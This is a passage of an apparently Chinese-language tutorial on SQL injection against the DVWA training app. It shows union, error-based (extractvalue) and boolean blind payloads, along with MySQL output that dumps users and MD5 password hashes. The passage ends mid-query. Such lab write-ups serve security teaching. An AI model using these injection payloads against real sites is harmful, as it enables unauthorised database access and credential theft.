</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>2</span><span class=w> </span><span class=k>rows</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>00</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>#</span><span class=err>获得</span><span class=n>users</span><span class=err>表中的字段</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=n>first_name</span><span class=p>,</span><span class=w> </span><span class=n>last_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>user_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=n>group_concat</span><span class=p>(</span><span class=k>column_name</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>table_schema</span><span class=o>=</span><span class=s1>&#39;dvwa&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>table_name</span><span class=o>=</span><span class=s1>&#39;users&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------+---------------------------------------------------------------------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>first_name</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>last_name</span><span class=w>                                                                 </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------+---------------------------------------------------------------------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>      </span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>                                                                     </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=mi>1</span><span class=w>          </span><span class=o>|</span><span class=w> </span><span class=n>user_id</span><span class=p>,</span><span class=n>first_name</span><span class=p>,</span><span class=n>last_name</span><span class=p>,</span><span class=k>user</span><span class=p>,</span><span class=n>password</span><span class=p>,</span><span class=n>avatar</span><span class=p>,</span><span class=n>last_login</span><span class=p>,</span><span class=n>failed_login</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------+---------------------------------------------------------------------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>2</span><span class=w> </span><span class=k>rows</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>00</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>#</span><span class=err>拿到</span><span class=n>first_name</span><span class=err>、</span><span class=n>password</span><span class=err>字段值</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ERROR</span><span class=w> </span><span class=mi>1222</span><span class=w> </span><span class=p>(</span><span class=mi>21000</span><span class=p>):</span><span class=w> </span><span class=n>The</span><span class=w> </span><span class=n>used</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=n>statements</span><span class=w> </span><span class=n>have</span><span class=w> </span><span class=n>a</span><span class=w> </span><span class=n>different</span><span class=w> </span><span class=nb>number</span><span class=w> </span><span class=k>of</span><span class=w> </span><span class=n>columns</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=n>first_name</span><span class=p>,</span><span class=w> </span><span class=n>last_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>user_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=k>user</span><span class=p>,</span><span class=n>password</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------+----------------------------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=n>first_name</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>last_name</span><span class=w>                        </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------+----------------------------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>      </span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>                            </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=k>admin</span><span class=w>      </span><span class=o>|</span><span class=w> </span><span class=mi>5</span><span class=n>f4dcc3b5aa765d61d8327deb882cf99</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>gordonb</span><span class=w>    </span><span class=o>|</span><span class=w> </span><span class=n>e99a18c428cb38d5f260853678922e03</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=mi>1337</span><span class=w>       </span><span class=o>|</span><span class=w> </span><span class=mi>8</span><span class=n>d3533d75ae2c3966d7e0d4fcc69216b</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>pablo</span><span class=w>      </span><span class=o>|</span><span class=w> </span><span class=mi>0</span><span class=n>d107d09f5bbe40cade3de5c71e9e9b7</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>|</span><span class=w> </span><span class=n>smithy</span><span class=w>     </span><span class=o>|</span><span class=w> </span><span class=mi>5</span><span class=n>f4dcc3b5aa765d61d8327deb882cf99</span><span class=w> </span><span class=o>|</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>+</span><span class=c1>------------+----------------------------------+
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=mi>6</span><span class=w> </span><span class=k>rows</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=p>(</span><span class=mi>0</span><span class=p>.</span><span class=mi>00</span><span class=w> </span><span class=n>sec</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></div><h2 id=3-报错注入>3 报错注入</h2><blockquote><p>使用DVWA SQL Injection模块，安全等级：Low</p></blockquote><p>报错注入顾名思义主要是利用数据库报错来进行判断是否存在注入点。如果不符合数据库语法规则就会产生错误。
常用的特殊字符：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-tex data-lang=tex><span class=line><span class=cl>&#39; <span class=k>\ </span>; <span class=c>%00 ) ( # &#34;
</span></span></span></code></pre></div><p>在mysql高版本（大于5.1版本）中添加了对XML文档进行查询和修改的函数：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-tex data-lang=tex><span class=line><span class=cl>#当这两个函数在执行时，如果出现xml文档路径错误就会产生报错。
</span></span><span class=line><span class=cl>extractvalue()
</span></span><span class=line><span class=cl>updatexml()
</span></span></code></pre></div><p><strong>报错注入常用函数</strong>：
<strong>extractvalue()函数</strong></p><ul><li><p>此函数从目标XML中返回包含所查询值的字符串。语法：extractvalue （XML_document，xpath_string 第一个参数：string格式，为XML文档对象的名称
第二个参数：xpath_string（xpath格式的字符串）
<code>select * from test where id=1 and extractvalue(1,concat(0x7e,(select user()),0x7e));</code></p></li><li><p>extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</p><p><code>select user,password from users where user_id=1 and extractvalue(1,0x7e);</code>
由于0x7e表示~，~不属于xpath语法格式，因此报出xpath语法错误。</p></li></ul><p>函数使用格式：extractvalue(xml_document,Xpath_string)，作用是从document中返回包含string的字符串，如果string参数不符合xpath的语法就会报错，将查询的结果放在报错信息里，即extractvalue函数报错时会解析SQL语句。</p><h3 id=31-前端注入>3.1 前端注入</h3><p><strong>注入思路：库名 -> 表名 -> 列名 -> 字段内容</strong></p><p><strong>注入语句</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>#</span><span class=w> </span><span class=err>爆库名</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=s1>&#39; and extractvalue(1,concat(0x7e,database()));#
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1># 爆列数
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>extractvalue</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=k>table_name</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>table_schema</span><span class=o>=</span><span class=k>database</span><span class=p>())));</span><span class=o>#</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>#</span><span class=w> </span><span class=err>爆表名</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=s1>&#39; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 1,1)));#
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1># 爆字段
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>extractvalue</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=k>table_name</span><span class=o>=</span><span class=s1>&#39;users&#39;</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>)));</span><span class=o>#</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>#</span><span class=w> </span><span class=err>得到密码</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=s1>&#39; and extractvalue(1,concat(0x7e,(select password from users where user_id=1)));#
</span></span></span></code></pre></div><blockquote><p><strong>注意：</strong> <code>select * from table limit m,n</code> ，其中 m 是指记录开始的 index，从 0 开始，表示第一条记录； n 是指从第 m+1 条开始，取 n 条。</p></blockquote><p><strong>注入结果</strong></p><p>分别执行3.1.1中的注入语句，得到以下结果</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326170537329.png data-srcset="/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326170537329.png, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326170537329.png 1.5x, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326170537329.png 2x" data-sizes=auto alt=/images/常见sql注入漏洞/image-20230326170537329.png title=image-20230326170537329></p><h3 id=32-后端注入>3.2 后端注入</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>#</span><span class=err>库名</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=n>first_name</span><span class=p>,</span><span class=w> </span><span class=n>last_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>user_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>extractvalue</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,</span><span class=k>database</span><span class=p>()));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ERROR</span><span class=w> </span><span class=mi>1105</span><span class=w> </span><span class=p>(</span><span class=n>HY000</span><span class=p>):</span><span class=w> </span><span class=n>XPATH</span><span class=w> </span><span class=n>syntax</span><span class=w> </span><span class=n>error</span><span class=p>:</span><span class=w> </span><span class=s1>&#39;~dvwa&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>#</span><span class=err>列数</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=n>first_name</span><span class=p>,</span><span class=w> </span><span class=n>last_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>user_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>extractvalue</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=k>table_name</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>table_schema</span><span class=o>=</span><span class=k>database</span><span class=p>())));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ERROR</span><span class=w> </span><span class=mi>1105</span><span class=w> </span><span class=p>(</span><span class=n>HY000</span><span class=p>):</span><span class=w> </span><span class=n>XPATH</span><span class=w> </span><span class=n>syntax</span><span class=w> </span><span class=n>error</span><span class=p>:</span><span class=w> </span><span class=s1>&#39;~2&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>#</span><span class=err>表名</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=n>first_name</span><span class=p>,</span><span class=w> </span><span class=n>last_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>user_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>extractvalue</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=k>table_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>table_schema</span><span class=o>=</span><span class=k>database</span><span class=p>()</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>)));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ERROR</span><span class=w> </span><span class=mi>1105</span><span class=w> </span><span class=p>(</span><span class=n>HY000</span><span class=p>):</span><span class=w> </span><span class=n>XPATH</span><span class=w> </span><span class=n>syntax</span><span class=w> </span><span class=n>error</span><span class=p>:</span><span class=w> </span><span class=s1>&#39;~users&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>#</span><span class=err>字段</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=n>first_name</span><span class=p>,</span><span class=w> </span><span class=n>last_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>user_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>extractvalue</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=k>table_name</span><span class=o>=</span><span class=s1>&#39;users&#39;</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>)));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ERROR</span><span class=w> </span><span class=mi>1105</span><span class=w> </span><span class=p>(</span><span class=n>HY000</span><span class=p>):</span><span class=w> </span><span class=n>XPATH</span><span class=w> </span><span class=n>syntax</span><span class=w> </span><span class=n>error</span><span class=p>:</span><span class=w> </span><span class=s1>&#39;~user_id&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>#</span><span class=err>密码</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> </span><span class=k>SELECT</span><span class=w> </span><span class=n>first_name</span><span class=p>,</span><span class=w> </span><span class=n>last_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>WHERE</span><span class=w> </span><span class=n>user_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>extractvalue</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>user_id</span><span class=o>=</span><span class=mi>1</span><span class=p>)));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ERROR</span><span class=w> </span><span class=mi>1105</span><span class=w> </span><span class=p>(</span><span class=n>HY000</span><span class=p>):</span><span class=w> </span><span class=n>XPATH</span><span class=w> </span><span class=n>syntax</span><span class=w> </span><span class=n>error</span><span class=p>:</span><span class=w> </span><span class=s1>&#39;~5f4dcc3b5aa765d61d8327deb882cf9&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mysql</span><span class=o>&gt;</span><span class=w> 
</span></span></span></code></pre></div><h2 id=4-布尔盲注>4 布尔盲注</h2><blockquote><p>使用DVWA SQL Injection（Blind）模块，安全等级：Low</p></blockquote><p><strong>由于篇幅限制，以下操作只演示关键步骤</strong></p><p>布尔很明显的Ture跟False，也就说它只会根据你的注入信息返回Ture跟False，也就没有了之前的报错信息。</p><h3 id=41-判断是否存在注入注入的类型>4.1 判断是否存在注入，注入的类型</h3><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326172046079.png data-srcset="/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326172046079.png, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326172046079.png 1.5x, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326172046079.png 2x" data-sizes=auto alt=/images/常见sql注入漏洞/image-20230326172046079.png title=image-20230326172046079></p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326172113838.png data-srcset="/images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326172113838.png, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326172113838.png 1.5x, /images/%e5%b8%b8%e8%a7%81sql%e6%b3%a8%e5%85%a5%e6%bc%8f%e6%b4%9e/image-20230326172113838.png 2x" data-sizes=auto alt=/images/常见sql注入漏洞/image-20230326172113838.png title=image-20230326172113838></p><p><strong>不管输入框输入为何内容，页面上只会返回以下2种情形的提示：</strong></p><ul><li><p>满足查询条件则返回"User ID exists in the database."，</p></li><li><p>不满足查询条件则返回"User ID isMISSING from the database."；</p></li></ul><p>两者返回的内容随所构造的真假条件而不同，说明存在SQL盲注。</p><h3 id=41-猜解当前数据库名称-二分法>4.1 猜解当前数据库名称 （二分法）</h3><h4 id=412获取数据库名长度>4.1.2获取数据库名长度</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39; and length(database())&gt;10;# MISSING
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>length</span><span class=p>(</span><span class=k>database</span><span class=p>())</span><span class=o>&gt;</span><span class=mi>5</span><span class=p>;</span><span class=o>#</span><span class=w> </span><span class=n>MISSING</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=s1>&#39; and length(database())&gt;3;# exists
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>length</span><span class=p>(</span><span class=k>database</span><span class=p>())</span><span class=o>=</span><span class=mi>4</span><span class=p>;</span><span class=o>#</span><span class=w> </span><span class=k>exists</span><span class=w>
</span></span></span></code></pre></div><p>可判断出当前所连接数据库名称的长度=4</p><h4 id=422逐个获取数据库名>4.2.2逐个获取数据库名</h4><p>在给定的字符串中利用substr()函数，从指定位置开始截取指定长度的字符串，分离出数据库名称的每个位置的元素，并分别将其转换为ASCII码，与对应的ASCII码值比较大小，找到比值相同时的字符，然后各个击破。</p><p><a href=https://www.sojson.com/asciitable.html target=_blank rel="noopener noreffer">ASCII码对照表 —在线工具 (sojson.com)</a></p><blockquote><p>函数用法：</p><p>substr(strings|express,num start,num length);
select substr(参数1，参数2，参数3) from 表名
strings|express：被截取的字符串或字符串表达式；start为起始位置；length为长度。</p></blockquote><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39; and ascii(substr(database(),1,1))&gt;88;# exists
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=n>substr</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>))</span><span class=o>&gt;</span><span class=mi>98</span><span class=p>;</span><span class=o>#</span><span class=w> </span><span class=k>exists</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=s1>&#39; and ascii(substr(database(),1,1))&gt;100;# MISSING
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=n>substr</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>))</span><span class=o>=</span><span class=mi>100</span><span class=p>;</span><span class=o>#</span><span class=w> </span><span class=k>exists</span><span class=w>
</span></span></span></code></pre></div><p>数据库名称的首位字符对应的ASCII码为100，查询是字母 d</p><p>重复以上操作，分别拆解第2/3/4个字符：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39; and ascii(substr(database(),2,1))=118;# 第2位字符为 v
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>ascii</span><span class=p>(</span><span class=n>substr</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=mi>3</span><span class=p>,</span><span class=mi>1</span><span class=p>))</span><span class=o>=</span><span class=mi>119</span><span class=p>;</span><span class=o>#</span><span class=w> </span><span class=err>第</span><span class=mi>3</span><span class=err>位字符为</span><span class=w> </span><span class=n>w</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=s1>&#39; and ascii(substr(database(),4,1))=97;# 第4位字符为 a
</span></span></span></code></pre></div><p>最终，获取到当前连接数据库的名称为：dvwa</p><h3 id=43-拆解数据库中的表名>4.3 拆解数据库中的表名</h3><h4 id=431-拆解表的个数>4.3.1 拆解表的个数</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39; and (select count(table_name) from information_schema.tables where
</span></span></span><span class=line><span class=cl><span class=s1>table_schema=database())&gt;10;# MISSING
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=k>table_name</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>where</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>table_schema</span><span class=o>=</span><span class=k>database</span><span class=p>())</span><span class=o>&gt;</span><span class=mi>5</span><span class=p>;</span><span class=o>#</span><span class=w> </span><span class=n>MISSING</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=s1>&#39; and (select count(table_name) from information_schema.tables where
</span></span></span><span class=line><span class=cl><span class=s1>table_schema=database())&gt;2;# MISSING
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=k>table_name</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>where</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>table_schema</span><span class=o>=</span><span class=k>database</span><span class=p>())</span><span class=o>=</span><span class=mi>2</span><span class=p>;</span><span class=o>#</span><span class=w> </span><span class=k>exists</span><span class=w>
</span></span></span></code></pre></div><p>dvwa数据库中表的个数=2</p><h4 id=432-拆解表名>4.3.2 拆解表名</h4><p>1）猜解dvwa数据库中第1个表的名称字符长度=9</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=mi>1</span><span class=s1>&#39; and length(substr((select table_name from information_schema.tables where
</span></span></span><span class=line><span class=cl><span class=s1>table_schema=database() limit 0,1),1))&gt;10;# MISSING
</span></span></span><span class=line><span class=cl><span class=s1>1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>length</span><span class=p>(</span><span class=n>substr</span><span class=p>((</span><span class=k>select</span><span class=w> </span><span class=k>table_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>where</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>table_schema</span><span class=o>=</span><span class=k>database</span><span class=p>()</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=mi>1</span><span class=p>))</span><span class=o>&gt;</span><span class=mi>5</span><span class=p>;</span><span class=o>#</span><span class=w> </span><span class=k>exists</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=mi>1</span><span class=s1>&#39; and length(substr((select table_name from information_schema.tables where
